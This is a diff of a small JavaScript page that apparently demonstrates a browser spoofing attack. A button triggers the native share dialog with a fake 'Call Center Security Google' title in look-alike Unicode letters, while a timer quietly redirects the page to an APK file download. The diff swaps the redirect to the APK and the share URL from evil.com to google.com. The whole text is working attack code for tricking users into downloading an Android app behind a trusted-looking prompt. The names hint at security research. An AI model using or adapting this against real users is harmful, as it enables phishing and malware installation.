@@ -7,15 +7,16 @@ document.getElementById('b').onclick = async () => {
 
   // Trigger navigation shortly after share is requested
   setTimeout(() => {
-    location.href = 'https://google.com/';
+    location.href = 'https://ecdnts-del.github.io/test-apk/dummy.apk';
   }, 300);
 
   await navigator.share({
     title: '𝐶𝑎𝑙𝑙 𝐶𝑒𝑛𝑡𝑒𝑟 𝑆𝑒𝑐𝑢𝑟𝑖𝑡𝑦 𝐺𝑜𝑜𝑔𝑙𝑒',
-    url: 'https://evil.com'
+    url: 'https://google.com'
   });
 };
 </script>
+
 
 
 
